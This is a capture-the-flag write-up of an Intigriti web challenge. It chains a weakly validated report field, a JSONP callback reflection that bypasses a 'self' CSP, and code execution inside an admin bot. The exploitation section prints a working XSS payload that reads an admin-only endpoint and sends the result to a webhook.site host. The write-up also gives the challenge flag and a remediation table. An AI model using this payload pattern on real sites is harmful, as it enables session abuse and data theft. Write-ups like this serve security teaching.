<div align="center">

# 📺 Bad Reception

### Intigriti August 2026 — Web Challenge (`0826`) Write-up

*One leading digit past a validator → a same-origin JSONP endpoint that reflects its callback into live JavaScript → first-party code execution inside a moderation bot → an admin-only TV channel and the flag.*

<br>

[](https://app.intigriti.com/)
[](#)
[](#)
[](#)

[](https://cwe.mitre.org/data/definitions/20.html)
[](https://cwe.mitre.org/data/definitions/79.html)
[](#8-impact--severity)

**📖 [Read the full styled write-up →](https://rajib-mahmud.github.io/intigriti-0826/)**

</div>

---

## 🎯 At a glance

| | |
|---|---|
| **Challenge** | *Bad Reception* — `https://challenge-0826.challenges.intigriti.io` |
| **Category** | Web · stored HTML injection → JSONP CSP-bypass → privilege escalation |
| **CWE** | [CWE-20](https://cwe.mitre.org/data/definitions/20.html) (Improper Input Validation) · [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (XSS) |
| **Researcher** | [`rajib_mahmud`](https://app.intigriti.com/profile/rajib_mahmud) (Intigriti) · [`rajib-mahmud`](https://github.com/rajib-mahmud) (GitHub) |
| **Impact** | First-party JS execution in the admin-bot context; disclosure of an access-controlled channel |
| **Flag** | `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}` |

---

## 📑 Table of contents

- [TL;DR](#-tldr)
- [The attack chain](#-the-attack-chain)
- [1. The challenge](#1-the-challenge)
- [2. Reconnaissance](#2-reconnaissance)
- [3. The vulnerability](#3-the-vulnerability)
- [4. Exploitation](#4-exploitation)
- [5. Proof of Concept](#5-proof-of-concept)
- [6. Impact & severity](#6-impact--severity)
- [7. Root cause & remediation](#7-root-cause--remediation)
- [8. Takeaways](#8-takeaways)
- [Full write-up](#-full-write-up)

---

## 🧨 TL;DR

The app is a retro TV: channels **1–10** of static and a **"report bad reception"** button. The report form's `channelId` is validated by a single rule — **it must start with a digit** — so injected markup sails through.

That markup is reflected **unencoded** into `/moderate/{id}`, a page a privileged **admin bot** opens automatically. An inline `onerror` report already draws a hit from the bot, but the decisive step is loading a same-origin **JSONP endpoint** — `<script src="/api/jsonp?callback=…">` — that reflects `callback` into an `application/javascript` response. Because the script's *origin* is first-party, it runs **even under a strict `script-src 'self'` CSP**. From inside the bot it fetches the admin-only **channel 11**, exfiltrates the stream filename to a webhook; download the video, read the flag off the frame.

> **The one-liner:** don't fight the CSP — find the same-origin endpoint it forgot to distrust.

---

## 🔗 The attack chain

```mermaid
flowchart LR
    R["POST /api/report<br/>channelId=1&lt;script src=/api/jsonp…&gt;"]
    R --> Q["report queued"]
    Q --> BOT["admin bot opens<br/>/moderate/{id}"]
    BOT --> JP["&lt;script src=/api/jsonp?callback=…&gt;<br/>reflects into live JS"]
    JP --> EXEC["first-party code execution<br/>inside the bot (CSP-safe)"]
    EXEC --> CH["fetch /api/channels/11/load<br/>→ &lt;hash&gt;.mp4"]
    CH --> HOOK["webhook receives filename"]
    HOOK --> DL["GET /static/streams/&lt;hash&gt;.mp4<br/>→ FLAG"]

    classDef first fill:#102a29,stroke:#5ad4c6,color:#bfeae4,stroke-width:1.5px;
    classDef last fill:#2c2411,stroke:#f4b860,color:#f3ddb0,stroke-width:1.5px;
    classDef neutral fill:#141924,stroke:#2e3a4f,color:#d7dee9;
    class R,Q,BOT neutral;
    class JP,EXEC,CH,HOOK first;
    class DL last;
```



---

## 1. The challenge

A retro TV UI shows static, ten channel buttons (all static), and a **"Report bad reception"** button. The front-end hardcodes exactly ten channels and reads no channel number from the URL or hash — so the "channel 11" the hints keep teasing was never a front-end toggle.

The three official hints frame the intended path before any proxy is opened:

1. *"…still limited to only 10 channels?"* → **there are more than 10 channels.**
2. *"…you can always report it."* → **the report feature is the attack surface.**
3. *"The report form accepts more than you'd expect. Getting it to execute is another web browser challenge."* → **injection + execution in a browser (a bot).**

> *report → injection → bot execution → a hidden channel*

## 2. Reconnaissance

The report button `POST`s a `channelId` to `/api/report`. Server-side validation is almost nothing — **it only checks the value starts with a digit** — so everything after that first character passes through.

A first probe (`channelId=1`) drew an out-of-band hit within seconds from a **HeadlessChrome** with `Referer: http://web/`: something internal renders the report. A `<meta name="referrer" content="unsafe-url">` trick leaked the full path — `http://web/moderate/<id>` — which returns a flat **403** to anyone outside. The bot can open a page we can't.

Three endpoints matter:

| Endpoint | Behaviour |
|---|---|
| `GET /api/channels/{n}/load` | Streams a filename, or 403 outside 1–10 |
| `POST /api/report` | Queues a report → admin bot visits `/moderate/{id}` |
| `GET /api/jsonp?callback=` | **Unsanitised JSONP** — reflects `callback` into `application/javascript` |

## 3. The vulnerability

`channelId` is reflected **unencoded** into the bot's moderation page, and validation only inspects the first character — so markup after the leading digit executes in the bot. Passive tags (``, `<style>`) can *trigger* a request but can't *read* the response, and reading channel 11 requires reading a response. That needs script execution.

The reliable primitive is the **JSONP endpoint**: `GET /api/jsonp?callback=X` returns `/**/ X({"channels":10});` as JavaScript, with **no validation on `X`**. Drop an entire self-invoking function in as the "callback," end it with `//` to comment out the trailing `({"channels":10});`, and load it as a first-party script:

```html
1<script src="/api/jsonp?callback=(async()=>{ /* attacker JS */ })()//"></script>
```

Because `/api/jsonp` is same-origin, `<script src>` of it is **exactly what `script-src 'self'` is built to allow** — the CSP can't tell this first-party endpoint echoes attacker input back as code.

## 4. Exploitation

The `channelId` injection delivers the JSONP script into the bot. Inside the bot's page the exfil function runs same-origin, reads channel 11, and beacons the filename out:

```http
POST /api/report HTTP/1.1
Host: challenge-0826.challenges.intigriti.io
Content-Type: application/x-www-form-urlencoded

channelId=1<script src="/api/jsonp?callback=(async()=>{try{const t=await(await fetch('/api/channels/11/load')).text();await fetch('https://webhook.site/<UUID>/f?t='+encodeURIComponent(t))}catch(e){fetch('https://webhook.site/<UUID>/e?e='+encodeURIComponent(e.message))}})()//"></script>
```

The webhook receives the privileged filename (only the bot can obtain it):

```
GET /f?t=3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
User-Agent: HeadlessChrome/...   Referer: http://web/
```

The download path isn't guessed — it's **confirmed from channels 1–10**, which serve `/static/streams/static.mp4`. Channel 11 uses the same directory with the bot-supplied hash:

```bash
curl -o ch11.mp4 "https://challenge-0826.challenges.intigriti.io/static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4"
```

The on-screen text of the video is the flag:

```
INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}
```

## 5. Proof of Concept

A minimal, dependency-free harness (grab a session → submit the JSONP payload → poll the webhook → download) is in the [full write-up](https://rajib-mahmud.github.io/intigriti-0826/#5-proof-of-concept). It uses only the Python standard library and a `webhook.site` token.

## 6. Impact & severity

Rated **High**, end to end: **unauthenticated**, **zero user interaction** beyond an admin viewing a report, and **full first-party JavaScript execution** inside a privileged internal session, with confirmed disclosure of access-controlled content as proof.

The channel-11 privilege is bound to the **bot's request context** — the same `/api/channels/11/load` request replayed from the public internet returns `channel not available`. So the read must happen *inside* the bot; a credential alone wouldn't do it. In a production analogue, the same primitive would walk any same-origin endpoint the bot's session can reach, or pivot into internal-only services `http://web` can talk to.

## 7. Root cause & remediation

| Layer | Problem | Fix |
|---|---|---|
| **JSONP gadget** | `/api/jsonp?callback=` reflects arbitrary input into a script-typed response | Allow-list the callback: `^[A-Za-z_$][A-Za-z0-9_$]*$`, or remove the endpoint |
| **Input validation** | `channelId` only checks the first character is a digit | Validate strictly (`^\d+$`) against known channels |
| **Output encoding** | `channelId` reflected unencoded into `/moderate/{id}` | HTML-encode all user input before rendering |
| **Access control** | `/api/channels/11/load` is reachable from the bot's context | Enforce the 1–10 range identically for every caller |
| **CSP** | `script-src 'self'` trusts the whole origin, JSONP echo included | Move to a **nonce-based** CSP so same-origin reflections can't load as script |

Fixing the JSONP callback *or* HTML-encoding `channelId` breaks the chain on its own; together they close it at every layer.

## 8. Takeaways

- **"Starts with a digit" is not "is a number."** Anchor validators (`^…$`); prefer parse-and-reject over substring checks.
- **`script-src 'self'` is only as strong as every same-origin endpoint.** One first-party endpoint reflecting input into a script-typed response turns the CSP's trust into the hole.
- **A stolen credential isn't a stolen capability.** Channel 11's privilege was bound to the bot's context, not a token — so the exploit had to run *inside* the bot.
- **Confirm, don't guess.** The download path came from a template observed on channels we controlled, plus a filename only the bot could produce.
- **A slow bot looks exactly like a broken exploit.** On shared, rate-limited queues, patience and light retry logic are part of the exploit.

---

## 📖 Full write-up

The complete write-up — interactive attack-chain stepper, beginner "concept boxes" for CSP / JSONP / same-origin, sequence diagrams, the full Python PoC, and layered remediation — lives here:

### **→ [rajib-mahmud.github.io/intigriti-0826](https://rajib-mahmud.github.io/intigriti-0826/)**

---

<div align="center">

<sub>Write-up by <a href="https://app.intigriti.com/profile/rajib_mahmud"><code>rajib_mahmud</code></a> (Intigriti) · <a href="https://github.com/rajib-mahmud"><code>rajib-mahmud</code></a> (GitHub) · Dhaka, BD</sub><br>
<sub>Intigriti August 2026 Challenge · Educational / responsible-disclosure purposes only.</sub>

<br>

`html-injection` · `jsonp-callback` · `csp-bypass` · `xss` · `wordlist-recon` · `intigriti` · `ctf-writeups`

</div>
